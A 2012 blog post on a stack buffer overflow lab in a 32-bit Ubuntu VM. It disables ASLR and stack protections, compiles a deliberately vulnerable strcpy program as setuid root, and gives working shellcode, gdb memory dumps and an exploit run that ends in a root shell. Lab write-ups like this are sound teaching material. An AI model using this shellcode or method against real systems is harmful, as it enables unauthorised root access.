---
title: "Buffer Overflow Exercise in Ubuntu"
date: 2012-05-22
categories:
  - Exploit 
tags:
  - Buffer Overflow
  - Ubuntu
toc: false
---
In Ubuntu system, there is some protection scheme deployed to avoid buffer overflow attacks. Before deploy the attach, we should disable all the kernel functionality that protect the system from buffer overflow.

The program I am going to use is a small piece of c code that uses a strcpy function. The program is shown bellow. The machine I am using is a VirtualBox Ubuntu 12.04 32bit hosted on a 64bit Windows 7.

```c
/* file: bof.c */
/* This is a vulnerable program that can be exploited easily */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
 
int main(int argc, char *argv[]){
   char buffer[100];
   strcpy(buffer,  argv[1]);
   return 0;
}
```

First, Ubuntu and several other Linux-based systems use address space layout randomization (ASLR) to fuzz the starting address of heap and stack. This makes guessing the exact addresses difficult. For simplicity reason, we can turn off the protection by the following command
```bash
sysctl -w kernel.randomize_va_space=0
# or
echo 0 > /proc/sys/kernel/randomize_va_space
```
This will disable the ASLR buffer overflow mechanism.

A bit about Address Space Layout Randomisation (ASLR) [^Ubuntu ASLR]

> ASLR is implemented by the kernel and the ELF loader by randomising the location of memory allocations (stack, heap, shared libraries, etc). This makes memory addresses harder to predict when an attacker is attempting a memory-corruption exploit. ASLR is controlled system-wide by the value of /proc/sys/kernel/randomize_va_space. Prior to Ubuntu 8.10, this defaulted to "1" (on). In later releases that included brk ASLR, it defaults to "2" (on, with brk ASLR).


Next is the gcc options for making the buffer overflow practical. The first one is StackGuard and the second is DEP, which stand for Data Execution Prevention. We can "turn on" these options in compiling the vulnerable program and make the overrun return address can be realized and the code resides in the buffer can be executed.

A bit about Data Execution Prevention (DEP) [^Disable DEP]

> Another defense mechanism that has been implemented is called DEP, which stands for Data Execution Prevention. This is an attempt to prevent the return address from being changed into something in the same memory space as the data, and also prevent machine code (the code that buffer overflows are crafted in) from being placed into data segments. Return Oriented Programming (ROP) is used when defeating modern DEP.

> To combat additional filters, attackers have developed polymorphic and multi-architecture alphanumeric shellcode and polymorphic ASCII machine code and shellcodes. ASCII and Polymorphic ASCII code looks to many filters like normal user input instead of malicious binary or machine code.

Following gcc command removes the stack protection and enable the code to execute from stack. Disable the stack protection is by the gcc option `-fno-stack-protector`, and the `-z execstack` is making the code can execute from the stack.

```bash
gcc -g -fno-stack-protector -z execstack bof.c -o bof
```

Setuid binary is used for this example to ensure the retrieval of a root shell. Set up the bof binary for setuid below:

```bash
rui@rui-VMUbuntu:~/code/vul_impl$ sudo chown root:root ./bof
rui@rui-VMUbuntu:~/code/vul_impl$ sudo chmod 4755 ./bof
```

Then we can check how many bytes it needs to overwrite the return address. We run the executable with 100 chars first, and then gradually increase the string parameter by 4 bytes.  As shown in the following, we need 116 = 112 + 4 bytes to overwrite the return address, in which the last 4 bytes is the return address we are want to jump to, because it is an address space in the stack that holds our shellcode.

```bash
rui@rui-VMUbuntu:~/code/vul_impl$ ./bof `perl -e 'print "A"x104'`
rui@rui-VMUbuntu:~/code/vul_impl$ ./bof `perl -e 'print "A"x108'`
rui@rui-VMUbuntu:~/code/vul_impl$ ./bof `perl -e 'print "A"x112'`
Illegal instruction (core dumped)
```

We are going to use the following large string to overflow the buffer. The string length is 60(nop) + 45(shellcode) + 7(rubbish) + 4 = 116 bytes.

```bash
`ruby -e 'print "\x90"*60,"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh", "A"*7, "\x20\xf5\xff\xbf"'`
```

The last 4 bytes is the address for the `nop` bytes resides in the buffer. You can first put some random bytes such as "\x41\x41\x41\x41". Then to using gdb to peek the address space, to find where the "\x90" is, and substitute for the last 4 bytes, in this experiment, it is "\x20\xf5\xff\xbf". Here is how we get there.

```bash
rui@rui-VMUbuntu:~/code/vul_impl$ gdb -q bof
Reading symbols from /home/rui/code/vul_impl/bof...done.
(gdb) break main
Breakpoint 1 at 0x80483ed: file bof.c, line 7.
(gdb) r `ruby -e 'print "\x90"*60,"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh", "A"*7, "\x20\xf5\xff\xbf"'`
Starting program: /home/rui/code/vul_impl/bof `ruby -e 'print "\x90"*60,"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh", "A"*7, "\x20\xf5\xff\xbf"'`

Breakpoint 1, main (argc=3, argv=0xbffff374) at bof.c:7
7    strcpy(buffer,  argv[1]);
(gdb) x/200x $esp
0xbffff250: 0xbffff28f 0xbffff28e 0x00000000 0xb7ff3fdc
0xbffff260: 0xbffff314 0xb7fdd000 0x00000000 0xb7e57053
0xbffff270: 0x0804824c 0x00000000 0x2cb4304e 0x00000001
0xbffff280: 0xbffff4ed 0x0000002f 0xbffff2dc 0xb7fc4ff4
0xbffff290: 0x08048410 0x08049ff4 0x00000003 0x080482dd
0xbffff2a0: 0xb7fc53e4 0x00000005 0x08049ff4 0x08048431
0xbffff2b0: 0xffffffff 0xb7e571a6 0xb7fc4ff4 0xb7e57235
0xbffff2c0: 0xb7fed270 0x00000000 0x08048419 0xb7fc4ff4
0xbffff2d0: 0x08048410 0x00000000 0x00000000 0xb7e3d4d3
0xbffff2e0: 0x00000003 0xbffff374 0xbffff384 0xb7fdc858
0xbffff2f0: 0x00000000 0xbffff31c 0xbffff384 0x00000000
0xbffff300: 0x0804821c 0xb7fc4ff4 0x00000000 0x00000000
0xbffff310: 0x00000000 0xe62392a7 0xde6f76b7 0x00000000
0xbffff320: 0x00000000 0x00000000 0x00000003 0x08048330
0xbffff330: 0x00000000 0xb7ff26a0 0xb7e3d3e9 0xb7ffeff4
0xbffff340: 0x00000003 0x08048330 0x00000000 0x08048351
0xbffff350: 0x080483e4 0x00000003 0xbffff374 0x08048410
0xbffff360: 0x08048480 0xb7fed270 0xbffff36c 0xb7fff918
0xbffff370: 0x00000003 0xbffff4ed 0xbffff509 0xbffff57a
0xbffff380: 0x00000000 0xbffff57e 0xbffff591 0xbffff5bc
0xbffff390: 0xbffff5cc 0xbffff5d7 0xbffff628 0xbffff63a
0xbffff3a0: 0xbffff664 0xbffff66d 0xbffffb8e 0xbffffbc8
0xbffff3b0: 0xbffffbfc 0xbffffc22 0xbffffc58 0xbffffcb6
0xbffff3c0: 0xbffffcc1 0xbffffcf1 0xbffffd0b 0xbffffd71
0xbffff3d0: 0xbffffd80 0xbffffd9c 0xbffffdad 0xbffffdc4
0xbffff3e0: 0xbffffdfd 0xbffffe1c 0xbffffe25 0xbffffe3a
0xbffff3f0: 0xbffffe49 0xbffffe51 0xbffffe7d 0xbffffe89
0xbffff400: 0xbffffeeb 0xbfffff3d 0xbfffff5d 0xbfffff6a
0xbffff410: 0xbfffff84 0xbfffffa6 0xbfffffc7 0x00000000
0xbffff420: 0x00000020 0xb7fdd414 0x00000021 0xb7fdd000
0xbffff430: 0x00000010 0x078bfbff 0x00000006 0x00001000
0xbffff440: 0x00000011 0x00000064 0x00000003 0x08048034
0xbffff450: 0x00000004 0x00000020 0x00000005 0x00000009
0xbffff460: 0x00000007 0xb7fde000 0x00000008 0x00000000
0xbffff470: 0x00000009 0x08048330 0x0000000b 0x000003e8
0xbffff480: 0x0000000c 0x000003e8 0x0000000d 0x000003e8
0xbffff490: 0x0000000e 0x000003e8 0x00000017 0x00000001
0xbffff4a0: 0x00000019 0xbffff4cb 0x0000001f 0xbfffffe0
0xbffff4b0: 0x0000000f 0xbffff4db 0x00000000 0x00000000
0xbffff4c0: 0x00000000 0x00000000 0xe5000000 0x29b0036b
0xbffff4d0: 0x2eec0ce3 0x2df0e10c 0x694c8f9c 0x00363836
0xbffff4e0: 0x00000000 0x00000000 0x00000000 0x6f682f00
---Type <return> to continue, or q <return> to quit---
0xbffff4f0: 0x722f656d 0x632f6975 0x2f65646f 0x5f6c7576
0xbffff500: 0x6c706d69 0x666f622f 0x90909000 0x90909090
0xbffff510: 0x90909090 0x90909090 0x90909090 0x90909090
0xbffff520: 0x90909090 0x90909090 0x90909090 0x90909090
0xbffff530: 0x90909090 0x90909090 0x90909090 0x90909090
0xbffff540: 0x90909090 0x5e1feb90 0x31087689 0x074688c0
0xbffff550: 0xb00c4689 0x8df3890b 0x568d084e 0x3180cd0c
0xbffff560: 0x40d889db 0xdce880cd 0x2fffffff 0x2f6e6962
```

The last step is to use the long string to hack the vulnerable program to get root access to the local machine. We issue the following command with the appropriate return address to overwrite. (the last 4 bytes of the array) You might try any stress in the highlighted address space shown above. I tried twice, and finally get it hacked, the following is the results I got.

```bash
rui@rui-VMUbuntu:~/code/vul_impl$ ./bof `ruby -e 'print "\x90"*60,"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh", "A"*7, "\x20\xf5\xff\xbf"'`
Illegal instruction
rui@rui-VMUbuntu:~/code/vul_impl$ ./bof `ruby -e 'print "\x90"*60,"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh", "A"*7, "\x30\xf5\xff\xbf"'`
# whoami
root
# 
```

To sum it up, several things need to be mention in order to get it work correctly.

1. Disable all the protection mechanisms, including Address Space Layout Randomisation (ASLR), Data Execution Prevention, and `-z execstack` option.
2. The vulnerable program complied executable `bof` should be setuid to root to make sure we get the root access shell.
3. To be patient about finding the return address.

That's it!

[^Ubuntu ASLR]: https://wiki.ubuntu.com/Security/Features/Historical#Address_Space_Layout_Randomisation_.28ASLR.29
[^Disable DEP]: http://www.blackhatacademy.org/security101/Buffer_overflow